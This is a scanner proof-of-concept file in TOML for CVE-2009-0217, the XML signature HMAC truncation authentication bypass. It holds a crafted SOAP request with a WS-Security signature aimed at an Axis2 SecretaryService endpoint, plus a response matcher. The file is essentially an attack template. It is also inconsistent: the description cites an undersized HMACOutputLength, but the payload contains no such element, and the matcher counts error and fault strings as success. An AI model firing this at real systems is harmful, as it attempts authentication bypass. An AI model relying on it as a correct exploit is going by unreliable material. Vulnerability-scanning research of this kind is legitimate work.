pocs/2009/POC-AVE-2009-0020.toml

[info]
author = "ave"
description = "通过设置过小的HMACOutputLength参数欺骗HMAC签名验证，绕过XML签名验证机制，实现认证绕过"
id = "POC-AVE-2009-0020"
name = "CVE-2009-0217 XML签名HMAC截断认证绕过 PoC"
severity = "high"
tags = [
    "ave-2009-0020",
    "cve-2009-0217",
]
vuln_id = [
    "CVE-2009-0217",
    "AVE-2009-0020",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/ws/axis2/SecretaryService"
protocol = "http"

[poc.requests.body]
content = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sec="http://secretary.ws.axis2.apache.org/">
   <soapenv:Header>
      <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" soapenv:mustUnderstand="1">
         <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="Signature-1">
            <ds:SignedInfo>
               <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
               <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#hmac-sha1"/>
               <ds:Reference URI="#id-1">
                  <ds:Transforms>
                     <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                  </ds:Transforms>
                  <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
                  <ds:DigestValue>dummy</ds:DigestValue>
               </ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue>truncated</ds:SignatureValue>
            <ds:KeyInfo>
               <wsse:SecurityTokenReference>
                  <wsse:KeyIdentifier ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509SubjectKeyIdentifier" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">dummy</wsse:KeyIdentifier>
               </wsse:SecurityTokenReference>
            </ds:KeyInfo>
            <ds:Object>
               <xenc:EncryptedKey xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Id="EK-1">
                  <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#kw-aes128"/>
                  <ds:KeyInfo>
                     <wsse:SecurityTokenReference>
                        <wsse:KeyIdentifier ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509SubjectKeyIdentifier" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">dummy</wsse:KeyIdentifier>
                     </wsse:SecurityTokenReference>
                  </ds:KeyInfo>
                  <xenc:CipherData>
                     <xenc:CipherValue>dummy</xenc:CipherValue>
                  </xenc:CipherData>
                  <xenc:ReferenceList>
                     <xenc:DataReference URI="#ED-1"/>
                  </xenc:ReferenceList>
               </xenc:EncryptedKey>
            </ds:Object>
         </ds:Signature>
      </wsse:Security>
   </soapenv:Header>
   <soapenv:Body wsu:Id="id-1" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <sec:getSecretaryInfo/>
   </soapenv:Body>
</soapenv:Envelope>"""
type = "raw"

[poc.requests.headers]
Content-Type = "application/soap+xml"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "处理失败",
    "faultstring",
    "Fault",
    "Exception",
    "error",
]
